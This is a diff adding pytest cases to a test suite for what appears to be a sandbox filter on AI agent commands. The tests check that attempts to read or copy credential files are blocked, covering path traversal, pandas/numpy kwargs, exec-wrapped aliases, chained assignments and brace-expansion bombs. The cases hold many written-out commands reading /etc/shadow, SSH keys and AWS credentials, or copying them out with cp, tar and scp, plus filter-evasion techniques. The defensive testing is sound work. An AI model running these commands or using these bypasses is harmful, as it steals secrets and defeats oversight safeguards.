@@ -2038,3 +2038,209 @@ class TestR5_UdpAndConnectExMetadata:
     )
     def test_udp_metadata_legit_allowed(self, code):
         assert not _is_blocked(code), f"legit udp blocked: {code!r}"
+
+
+class TestR6_PathTraversalNormalization:
+    """``~/../etc/shadow``, ``~root/../etc/shadow``, and ``/home/u/../u/
+    .aws/credentials`` all bypass the previous ``_normalize_path_separators``.
+    When ``..`` escapes the home prefix, the projection is now treated
+    as absolute so the runtime resolution (HOME=/root makes ``~/..`` =
+    ``/``) flows through ``_ABSOLUTE_SENSITIVE_RE``."""
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cat ~/../etc/shadow",
+            "cat ~/../../etc/shadow",
+            "cat ~/../etc/sudoers",
+            "cat ~/../root/.ssh/id_rsa",
+            "cat ~ubuntu/../../etc/shadow",
+            "cat ~root/../etc/shadow",
+            "cat /home/u/../u/.aws/credentials",
+            "cat /home/alice/../alice/.ssh/id_rsa",
+            "cat $HOME/../etc/shadow",
+        ],
+    )
+    def test_path_traversal_blocked(self, cmd):
+        assert _find_sensitive_paths(cmd), (
+            f"path traversal leaked: {cmd!r}"
+        )
+
+
+class TestR6_PandasNumpyKeywordArgs:
+    """``pd.read_csv(filepath_or_buffer='/etc/shadow')`` and
+    ``np.fromfile(fname='/etc/shadow')`` used the actual pandas /
+    numpy parameter names that the previous kwarg gate (``{"file",
+    "path"}``) missed. The kwarg list is now broad enough to cover
+    every common reader signature."""
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "import pandas as pd; pd.read_csv(filepath_or_buffer='/etc/shadow')",
+            "import pandas as pd; pd.read_excel(io='/home/u/.aws/credentials')",
+            "import pandas as pd; pd.read_pickle(filepath_or_buffer='/proc/self/environ')",
+            "import numpy as np; np.fromfile(fname='/etc/shadow')",
+            "import numpy as np; np.loadtxt(fname='/etc/shadow')",
+            "open(filepath='/etc/shadow')",
+            "open(filename='/home/u/.aws/credentials')",
+        ],
+    )
+    def test_pandas_numpy_kwarg_blocked(self, code):
+        assert _is_blocked(code), f"pandas/numpy kwarg leaked: {code!r}"
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "import pandas as pd; pd.read_csv(filepath_or_buffer='./data.csv')",
+            "import numpy as np; np.loadtxt(fname='train.txt')",
+        ],
+    )
+    def test_pandas_numpy_kwarg_legit_allowed(self, code):
+        assert not _is_blocked(code), f"legit pandas kwarg blocked: {code!r}"
+
+
+class TestR6_BashDirectoryExfil:
+    """``cp -r ~/.ssh /tmp/out`` and ``mv ~/.aws /tmp`` were not
+    blocked because ``_find_sensitive_paths`` only flagged named
+    files. The asymmetry-fix to the Python shutil dir-exfil gate
+    now mirrors directory-copy verbs in bash too: ``cp``, ``mv``,
+    ``rsync``, ``tar``, ``zip``, ``7z``, ``scp``, ``sftp``."""
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cp -r ~/.ssh /tmp/out",
+            "cp -r /home/u/.aws /tmp/out",
+            "cp -R ~/.gnupg /tmp/out",
+            "mv ~/.aws /tmp/out",
+            "mv /root/.kube /tmp/out",
+            "tar czf out.tar.gz ~/.ssh",
+            "tar -cvf out.tar /home/u/.aws",
+            "rsync -av ~/.aws/ /tmp/",
+            "rsync -r /home/u/.ssh/ remote:dst",
+            "zip -r out.zip ~/.ssh",
+            "7z a out.7z ~/.aws",
+            "scp -r ~/.ssh user@host:dst",
+            "cp -r /etc /tmp/etc-copy",
+        ],
+    )
+    def test_bash_dir_exfil_blocked(self, cmd):
+        assert _find_sensitive_paths(cmd), (
+            f"bash dir exfil leaked: {cmd!r}"
+        )
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "ls ~/.ssh",
+            "find ~/.aws -type f",
+            "cp ./src/a.txt ./dst/b.txt",
+            "mv ./old.log ./archive/",
+            "tar tf out.tar.gz",
+            "cat ~/.ssh/known_hosts",
+        ],
+    )
+    def test_bash_dir_exfil_legit_allowed(self, cmd):
+        assert not _find_sensitive_paths(cmd), (
+            f"legit bash dir blocked: {cmd!r}"
+        )
+
+
+class TestR6_InnerTreeAliasWalk:
+    """``exec("import shutil as sh\\nsh.copytree('/home/u/.ssh',
+    '/tmp/out')")`` previously slipped because the inner AST visit
+    ran without re-running the alias-tracking pre-pass. The
+    ``_run_alias_prepass`` helper now mirrors ``_run_string_binding_prepass``
+    on each literal eval / exec payload."""
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "exec(\"import shutil as sh\\nsh.copytree('/home/u/.ssh', '/tmp/out')\")",
+            "exec(\"from shutil import copytree\\ncopytree('/home/u/.ssh', '/tmp/out')\")",
+            "exec(\"import os as o\\no.system('cat /etc/shadow')\")",
+            "exec(\"from os.path import join\\nopen(join('/etc', 'shadow'))\")",
+        ],
+    )
+    def test_inner_alias_walk_blocked(self, code):
+        assert _is_blocked(code), f"inner alias leaked: {code!r}"
+
+
+class TestR6_ChainedAndAnnAssign:
+    """``a = b = '/etc/shadow'; open(a)`` (multi-target Assign) and
+    ``path: str = '/etc/shadow'; open(path)`` (AnnAssign) were
+    untracked by the binding pre-pass. Both shapes are now handled."""
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "a = b = '/etc/shadow'\nopen(a).read()",
+            "a = b = '/etc/shadow'\nopen(b).read()",
+            "a = b = c = '/proc/self/environ'\nopen(c)",
+            "path: str = '/etc/shadow'\nopen(path).read()",
+            "path: str = '/home/u/.aws/credentials'\nopen(path)",
+            "p: \"PathLike\" = '/etc/shadow'\nopen(p)",
+        ],
+    )
+    def test_chained_annassign_blocked(self, code):
+        assert _is_blocked(code), f"chained/AnnAssign leaked: {code!r}"
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "a = b = './data.txt'\nopen(a)",
+            "path: str = './logs/app.log'\nopen(path)",
+        ],
+    )
+    def test_chained_annassign_legit_allowed(self, code):
+        assert not _is_blocked(code), (
+            f"legit chained/AnnAssign blocked: {code!r}"
+        )
+
+
+class TestR6_BraceBombEmptyAlt:
+    """``cat ~/{,x0,...,x341}/{.ssh/id_rsa,other}`` exploited the
+    expansion cap. After expanding 342 alts of the first brace + 2
+    alts of the second, ``out`` exceeds 1024 and the empty alt's
+    second-brace expansion never runs -- so the leaf ``~/.ssh/id_rsa``
+    is never projected. ``_SENSITIVE_IN_BRACE_RE`` catches the
+    sensitive name inside an unexpanded brace attached to a sensitive
+    root."""
+
+    @pytest.mark.parametrize(
+        "n_dummies",
+        [3, 50, 200, 341, 500],
+    )
+    def test_brace_bomb_empty_alt_blocked(self, n_dummies):
+        dummies = ",".join(f"x{i}" for i in range(n_dummies))
+        cmd = f"cat ~/{{,{dummies}}}/{{.ssh/id_rsa,other}}"
+        assert _find_sensitive_paths(cmd), (
+            f"brace empty-alt bomb leaked at n={n_dummies}: {cmd!r}"
+        )
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cat /etc/{passwd,hosts}",
+            "cat /etc/{shadow,sudoers}",
+            "cat ~/{,a,b}/{.aws/credentials,safe}",
+        ],
+    )
+    def test_inner_brace_sensitive_blocked(self, cmd):
+        assert _find_sensitive_paths(cmd), (
+            f"inner-brace sensitive name leaked: {cmd!r}"
+        )
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cat ~/{notes,docs}/file.txt",
+            "cat /etc/{,hostname}",  # /etc/hostname is allow-listed
+            "cat ./workspace/home/u/{a,b}/{.aws/credentials,safe}",
+        ],
+    )
+    def test_brace_legit_allowed(self, cmd):
+        assert not _find_sensitive_paths(cmd), (
+            f"legit brace blocked: {cmd!r}"
+        )
